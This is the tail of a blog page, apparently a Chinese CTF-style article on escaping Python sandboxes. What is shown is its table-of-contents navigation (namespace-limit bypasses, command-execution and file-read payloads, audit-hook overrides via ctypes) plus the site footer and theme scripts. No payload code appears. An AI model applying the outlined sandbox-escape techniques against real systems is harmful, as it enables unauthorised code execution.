class="nav-text">eval + list + dict 构造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-%E5%92%8C-%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-text">过滤了 . 和 , 如何获取函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unicode-%E7%BB%95%E8%BF%87"><span class="nav-text">unicode 绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="nav-text">绕过命名空间限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E9%99%90%E5%88%B6"><span class="nav-text">部分限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E5%85%A8%E9%99%90%E5%88%B6"><span class="nav-text">完全限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%B1%BB"><span class="nav-text">获取 object 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%9A%84%E5%8F%AF%E7%94%A8%E5%AD%90%E7%B1%BB"><span class="nav-text">获取 object 的可用子类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E4%B8%AD%E7%9A%84%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-text">globals 中的可用模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">builtins 模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97-2"><span class="nav-text">os 模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">sys 模块</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8-payload"><span class="nav-text">常用 payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">文件读取</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6"><span class="nav-text">绕过多行限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exec"><span class="nav-text">exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#compile"><span class="nav-text">compile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%B7%E8%B1%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">海象表达式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-text">绕过长度限制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0"><span class="nav-text">替换函数名称</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E5%BC%80-input-%E8%BE%93%E5%85%A5"><span class="nav-text">打开 input 输入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-stdin-read"><span class="nav-text">sys.stdin.read()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-stdin-readline"><span class="nav-text">sys.stdin.readline()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-stdin-readlines"><span class="nav-text">sys.stdin.readlines()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-text">breakpoint 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0-1"><span class="nav-text">help 函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-audit-hook"><span class="nav-text">绕过 audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E-sys-addaudithook-%E7%9A%84-audit-hook"><span class="nav-text">绕过基于 sys.addaudithook 的 audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#loader-load-module-1"><span class="nav-text">__loader__.load_module</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#posixsubprocess-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">_posixsubprocess 执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">篡改内置函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%E6%9F%A5%E8%AF%A2%E6%A8%A1%E5%9D%97"><span class="nav-text">内省机制查询模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E-CPython-%E7%9A%84-audit-hook"><span class="nav-text">绕过基于 CPython 的 audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-ctypes-%E8%A6%86%E7%9B%96-audit-hook"><span class="nav-text">利用 ctypes 覆盖 audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#audit-hook-%E7%BB%93%E6%9E%84"><span class="nav-text">audit hook 结构</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PyRuntimeState"><span class="nav-text">_PyRuntimeState</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PyInterpreterState"><span class="nav-text">PyInterpreterState</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-audit-hook-%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-text">获取 audit hook 函数地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96-audit-hook"><span class="nav-text">覆盖 audit hook</span></a></li></ol></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        50 posts in total
                    </span>
                    
                        <span>
                            855.6k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>